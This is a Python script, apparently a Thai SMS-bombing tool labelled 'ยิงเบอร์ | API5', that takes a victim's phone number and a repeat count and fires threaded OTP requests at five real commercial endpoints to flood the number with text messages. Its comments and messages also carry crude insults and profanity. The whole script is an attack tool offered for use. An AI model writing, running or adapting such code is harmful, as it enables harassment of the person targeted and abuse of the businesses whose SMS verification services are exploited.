import os #ห้ามขาย
import time #apiฟรี
import threading 
os.system('clear') #ห้ามรับยิง
print("""\033[91m
██╗░░░░░░█████╗░░██████╗░██╗███╗░░██╗
██║░░░░░██╔══██╗██╔════╝░██║████╗░██║
██║░░░░░██║░░██║██║░░██╗░██║██╔██╗██║
██║░░░░░██║░░██║██║░░╚██╗██║██║╚████║
███████╗╚█████╔╝╚██████╔╝██║██║░╚███║
╚══════╝░╚════╝░░╚═════╝░╚═╝╚═╝░░╚══╝ """) 
name = input("\033[1;94mname :\033[1;93m ")
time.sleep(1) #ดีเลย์ 1 วิ
print("wait.........") #เจอใครเอาไปขายแจ้งทันที
password = input("\033[1;94mpass : \033[95m") #เจอใครเอาไปรับยิงแจ้งด้วย
time.sleep(1)
print("wait..........") #ขายหาพ่อมึงหรอ บ้านจน??
old = int(input("\033[1;94mold : \033[1;96m")) 
time.sleep(1) 

if old>=5: 
	print ("OK")
	print("\033[92mรอดิ") #หมอยไม่ขึ้นอายสาวนะ
	time.sleep(3)
	os.system("clear")
	print ("""\033[95m
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
███████╗░█████╗░░██████╗████████╗
██╔════╝██╔══██╗██╔════╝╚══██╔══╝
█████╗░░███████║╚█████╗░░░░██║░░░
██╔══╝░░██╔══██║░╚═══██╗░░░██║░░░
██║░░░░░██║░░██║██████╔╝░░░██║░░░
╚═╝░░░░░╚═╝░░╚═╝╚═════╝░░░░╚═╝░░░
┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈""")
	print ("[ ยิงเบอร์ | API5 | V1.0 BY SAI XD]")
	phone = input("\033[91m[+]เบอร์โทร :  🇹 🇭  66+ \033[91m") 
	print ("setting")
	jam = int(input("\033[91m[+]จำนวน : \033[91m")) 
	print ("setting")
	def api():
		requests.post("https://the1web-api.the1.co.th/api/t1p/regis/requestOTP", json={"on":{"value":phone,"country":"66"},"type":"mobile"})
		print ("\033[91mattack") #api 1
		
	def api2():
		requests.post("https://store.boots.co.th/api/v1/guest/register/otp",json={"phone_number": phone})
		print ("\033[91mattack") #api2
		
	def api3():
		requests.post("https://api.zaapi.co/api/store/auth/otp/login",json={"phoneNumber":f"+66{phone}","namespace":"zaapi-buyers"},headers={"user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36"})
		print ("\033[91mattack") #api3
		
	def api4():
		requests.post("https://u.icq.net/api/v65/rapi/auth/sendCode", json={"reqId":"39816-1633012470","params":{"phone": phone,"language":"en-US","route":"sms","devId":"ic1rtwz1s1Hj1O0r","application":"icq"}})
		print ("\033[91mattack") #api4
		
	def api5():
		requests.get(f"https://asv-mobileapp-prod.azurewebsites.net/api/Signin/SendOTP?phoneNo={phone}&type=Register")
		print ("\033[91mattack") #api5
		
	for i in range(jam): #loop
		threading.Thread(target=api).start() 
		threading.Thread(target=api2).start()
		threading.Thread(target=api3).start() 
		threading.Thread(target=api4).start()
		threading.Thread(target=api5).start() 
    
else:
    print("\033[91mอยากเเจกต่อให้เครดิตด้วย")
    print ("ใครไม่ให้เครดิตแปลว่าแม่พ่อมึงตาย")
    print ("\033[91mยังเด็กอยู่อ่ะมึงอ่ะใช้ไม่ได้หรอก")
    print ("ไอ้เด็กก****")
    print ("BY : SAI XD")
    